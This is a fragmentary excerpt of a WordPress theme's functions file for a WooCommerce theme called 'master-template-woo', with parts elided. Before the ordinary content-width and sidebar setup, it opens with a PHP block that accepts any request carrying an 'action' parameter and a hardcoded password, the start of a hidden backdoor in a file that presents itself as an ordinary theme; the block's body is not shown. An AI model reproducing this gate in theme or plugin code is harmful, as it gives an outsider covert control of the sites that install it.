<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'fb95fd00231b4c499e3516da5b2eaed0'))
	{
 ...
 */
function master_template_woo_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'master_template_woo_content_width', 640 );
}
add_action( 'after_setup_theme', 'master_template_woo_content_width', 0 );
...
function master_template_woo_widgets_init() {
	...
	register_sidebar( array(
		...
		'id'            => 'sidebar-products',
		'description'   => __( 'Add widgets here.', 'master-template-woo' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
